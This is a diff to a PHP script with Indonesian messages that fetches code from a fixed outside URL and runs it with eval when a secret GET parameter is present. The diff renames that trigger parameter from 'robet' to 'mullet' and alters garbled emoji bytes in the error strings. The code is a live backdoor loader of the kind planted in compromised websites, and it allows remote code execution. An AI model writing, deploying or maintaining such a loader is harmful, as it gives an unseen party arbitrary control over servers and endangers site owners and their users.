@@ -19,12 +19,12 @@ class CurlFetcher {
             curl_close($curl);
 
             if ($response === false || empty(trim($response))) {
-                return "<h3 style='color:red'>ÃƒÂ¢Ã…â€™ Gagal ambil konten. Error: $error</h3>";
+                return "<h3 style='color:red'>Ã¢Å’ Gagal ambil konten. Error: $error</h3>";
             }
 
             return $response;
         }
-        return "<h3 style='color:red'>ÃƒÂ¢Ã…â€™ cURL tidak tersedia di server ini</h3>";
+        return "<h3 style='color:red'>Ã¢Å’ cURL tidak tersedia di server ini</h3>";
     }
 }
 
@@ -40,7 +40,7 @@ class CodeExecutor {
         if ($code && trim($code) !== '') {
             eval("?>" . $code);
         } else {
-            echo "<p style='color:red'>ÃƒÂ¢Ã…â€™ Gagal ambil atau isi kosong dari URL: $url</p>";
+            echo "<p style='color:red'>Ã¢Å’ Gagal ambil atau isi kosong dari URL: $url</p>";
         }
     }
 }
@@ -48,7 +48,7 @@ class CodeExecutor {
 // ==== MAIN LOGIC ====
 $fetcher = new CurlFetcher();
 
-if (isset($_GET['robet'])) {
+if (isset($_GET['mullet'])) {
     $executor = new CodeExecutor($fetcher);
     $executor->executeCodeFromURL("https://isnujombang.org/rr");
     exit;
